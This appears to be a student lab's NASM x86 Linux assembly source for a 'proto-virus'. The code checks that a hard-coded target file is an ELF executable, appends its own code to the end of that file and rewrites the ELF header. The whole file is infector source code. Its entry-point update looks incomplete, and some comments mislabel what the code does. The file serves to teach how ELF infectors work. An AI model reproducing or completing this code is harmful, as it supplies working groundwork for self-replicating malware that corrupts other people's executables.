%macro	syscall1 2
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro	syscall3 4
    mov	edx, %4
    mov	ecx, %3
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro  exit 1
    syscall1 1, %1
%endmacro

%macro  write 3
    syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
    syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
    syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
    syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
    syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size    52
%define ELFHDR_phoff	28

%define STDOUT		1
%define FD dword [ebp-4]
%define elf_hdr ebp-56                        ; -4 - headrSize
%define fsize dword [ebp-60]                  ; addres before headr



    global _start

    section .text
_start:
    push ebp
    mov	ebp, esp
    sub	esp, STK_RES                          ; Set up ebp and reserve space on the stack for local storage

    
    .print_msg:                               ; else, it is an elf file, print  outStr
    call get_my_loc                           ; ??
    add  ecx, OutStr                          ; put the string in ecx
    write STDOUT, ecx, 32                     ; print the string to STDOUT

    .read_file:                               ; symbol name
    call get_my_loc_b                         ; ??
    add ebx, FileName                         ; push filename to ebx
    open ebx,RDWR, 0x777                      ; open in read/write mode
    mov FD, eax                               ; save fs of opend file
    cmp FD, -1                                ; if couldnt open file
    je err                                    ; display error msg and exit

    .get_headr:                               ; symbol name
    lea ecx, [elf_hdr]                        ; we use lea to load into struct
    read FD, ecx, ELFHDR_size                 ; read the header of ELF

    .is_elf:                                  ; symbol name
    cmp dword [elf_hdr], 0x464C457F           ; it is elf if the first bytes match 7f 45 4c in little endian
    jne err                                   ; bytes dont match, print the FailStr
                                              ; it is an elf

    .infect_file:
    lseek FD, 0, SEEK_END                     ; point to the end of the file
    mov fsize, eax                            ; store file size
    call get_my_loc
    add ecx, _start                           ; point to start of this file
    mov edx , virus_end - _start                ; script content
    write FD, ecx, edx                        ; append this script to a file

    .update_header:
    mov eax, 0x8048080                        ; base addres
    add eax, fsize
    lseek FD, 0, SEEK_SET                     ; point to the end of the file

    lea ecx, [elf_hdr]                        ; save offset
    write FD, ecx, ELFHDR_size                ; write the modified header

    close FD

VirusExit:
    exit 0                                    ; Termination if all is OK and no previous code to jump to
                                              ; (also an example for use of above macros)

err:
    call get_my_loc
    add  ecx, Failstr
    write STDOUT, ecx, 13
    exit 1

FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:	db "perhaps not", 10 , 0



get_my_loc:
    call .next_i
    .next_i:
        pop ecx
        sub ecx, .next_i
        ret

get_my_loc_b:
    call .next_i
    .next_i:
        pop ebx
        sub ebx, .next_i
        ret



PreviousEntryPoint: dd VirusExit
virus_end:
